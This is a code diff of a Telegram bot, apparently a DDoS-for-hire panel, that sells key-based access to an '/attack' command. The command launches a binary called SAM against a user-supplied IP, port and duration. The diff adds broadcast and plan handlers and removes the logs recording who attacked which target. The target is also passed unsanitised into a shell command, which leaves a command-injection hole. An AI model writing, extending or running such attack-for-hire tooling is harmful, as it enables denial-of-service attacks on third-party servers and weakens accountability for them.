@@ -139,7 +139,7 @@ user_access: dict      = read_user_access()
 active_keys: dict      = read_keys()
 RESELLER_IDS: set      = read_resellers()
 balances: dict         = read_balances()
-bgmi_cooldown = {} # Fixed: Now defined globally
+bgmi_cooldown = {} 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  UTILITIES
@@ -242,79 +242,72 @@ def welcome_start(message):
     )
     bot.reply_to(message, response, parse_mode="HTML")
 
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    bot.reply_to(message,
+@bot.message_handler(commands=['myplan', 'plan'])
+def show_plan(message):
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids:
+        bot.reply_to(message, no_access_msg())
+        return
+    if user_id in user_access:
+        expiry = fmt_expiry(user_access[user_id]['expiry_time'])
+        bot.reply_to(message,
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"      📅  YOUR PLAN\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"  Status   →  Active ✅\n"
+            f"  Expires  →  {expiry}\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━"
+        )
+    else:
+        bot.reply_to(message, "⚠️  No expiry info found.")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message):
+    user_id = str(message.chat.id)
+    if not is_admin(user_id):
+        bot.reply_to(message, admin_only_msg())
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "Usage: /broadcast <message>")
+        return
+
+    broadcast_content = parts[1]
+    text = (
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "      📋  COMMANDS\n"
+        "      📢  𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "  👤 USER COMMANDS\n"
-        "  /start    → Welcome screen\n"
-        "  /id       → Account info\n"
-        "  /plan     → Plan expiry\n"
-        "  /redeem   → Activate a key\n"
-        "  /mylogs   → Your activity\n"
-        "  /rules    → Usage rules\n"
-        "  /status   → Bot status\n\n"
-        "  🤝 RESELLER & ADMIN\n"
-        "  /prices   → Key price list\n"
-        "  /genkey   → Generate key\n"
-        "  /listkeys → List unused keys\n"
-        "  /deletekey→ Delete a key\n"
-        "  /balance  → Check balance\n\n"
-        "  🛠 ADMIN ONLY\n"
-        "  /admincmd → View admin panel\n"
-        "  /add      → Add user directly\n"
-        "  /remove   → Remove a user\n"
-        "  /allusers → List all users\n"
-        "  /addreseller → Add a reseller\n"
-        "  /rmreseller  → Remove reseller\n"
-        "  /resellers   → List resellers\n"
-        "  /addbalance  → Add funds\n"
-        "  /setbalance  → Set funds\n"
-        "  /broadcast   → Send msg to all\n"
-        "  /logs         → Get log file\n"
-        "  /clearlogs   → Clear log file\n\n"
+        f"{broadcast_content}\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
 
-# ... [Keep your other handlers like /status, /prices, /id, /plan, /mylogs, /redeem, /genkey, /listkeys, etc. exactly as they were] ...
+    # CRITICAL FIX: Read directly from files to ensure NO user is missed
+    all_users = set(read_users())
+    all_resellers = set(read_resellers())
+    all_targets = list(all_users | all_resellers | ADMIN_IDS)
+    
+    success, fail = 0, 0
+    for target in all_targets:
+        try:
+            bot.send_message(target, text)
+            success += 1
+            time.sleep(0.1) # Prevent Telegram flood limit
+        except Exception:
+            fail += 1
 
-@bot.message_handler(commands=['status'])
-def bot_status(message):
-    now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
     bot.reply_to(message,
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"      🟢  BOT STATUS\n"
+        f"    📢  𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗗𝗢𝗡𝗘\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  Status   →  Online ✅\n"
-        f"  Uptime   →  24 × 7\n"
-        f"  Time     →  {now}\n\n"
+        f"  ✅  Sent      →  {success}\n"
+        f"  ❌  Failed    →  {fail}\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━"
     )
-
-# ... [Include all admin/reseller logic from your original code] ...
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  ATTACK SYSTEM
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def record_command_logs(user_id, command, target=None, port=None, time_val=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target: log_entry += f" | Target: {target}"
-    if port: log_entry += f" | Port: {port}"
-    if time_val: log_entry += f" | Time: {time_val}"
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
-
-def log_command(user_id, target, port, time_val):
-    try:
-        user_info = bot.get_chat(user_id)
-        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
-    except:
-        username = f"UserID: {user_id}"
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_val}\n\n")
 
 def start_attack_reply(message, target, port, time_val):
     user_info = message.from_user
@@ -325,40 +318,44 @@ def start_attack_reply(message, target, port, time_val):
 @bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        if user_id not in ADMIN_IDS:
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
-                response = "You Are On Cooldown. Please Wait 1min Before Running The /attack Command Again."
-                bot.reply_to(message, response)
+    
+    # Check Plan Access
+    if user_id not in allowed_user_ids:
+        bot.reply_to(message, no_access_msg())
+        return
+
+    # Check Cooldown (Admin Bypass)
+    if not is_admin(user_id):
+        if user_id in bgmi_cooldown:
+            time_passed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
+            if time_passed < 60:
+                bot.reply_to(message, f"⏳ Cooldown! Wait {60 - time_passed}s.")
                 return
 
-        bgmi_cooldown[user_id] = datetime.datetime.now()
-                
-        command = message.text.split()
-        if len(command) == 4:
-           target = command[1]
-           try:
-               port = int(command[2])
-               time_val = int(command[3])
-           except ValueError:
-               bot.reply_to(message, "❌ Error: Port and Time must be numbers.")
-               return
+    command = message.text.split()
+    if len(command) == 4:
+        target = command[1]
+        try:
+            port = int(command[2])
+            time_val = int(command[3])
+        except ValueError:
+            bot.reply_to(message, "❌ Port and Time must be numbers.")
+            return
 
-           if time_val > 600 :
-              response = "Error: Time interval must be less than 600."
-           else:
-                record_command_logs(user_id, '/attack', target, port, time_val)
-                log_command(user_id, target, port, time_val)
-                start_attack_reply(message, target, port, time_val)
-                full_command = f"./SAM {target} {port} {time_val} 500"
-                subprocess.run(full_command, shell=True)
-                response = f" 🚀 Attack Finished! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time_val} seconds"
-        else:
-            response = "✅ Usage :- /attack <target> <port> <time>"
-    else:
-        response = no_access_msg()
+        if time_val > 600:
+            bot.reply_to(message, "❌ Max time is 600s.")
+            return
+
+        bgmi_cooldown[user_id] = datetime.datetime.now()
+        start_attack_reply(message, target, port, time_val)
         
-    bot.reply_to(message, response)
+        # Execute binary
+        full_command = f"./SAM {target} {port} {time_val} 500"
+        subprocess.run(full_command, shell=True)
+        
+        bot.send_message(message.chat.id, f"🚀 Attack Finished!\nTarget: {target}")
+    else:
+        bot.reply_to(message, "✅ Usage: /attack <target> <port> <time>")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  ENTRY POINT
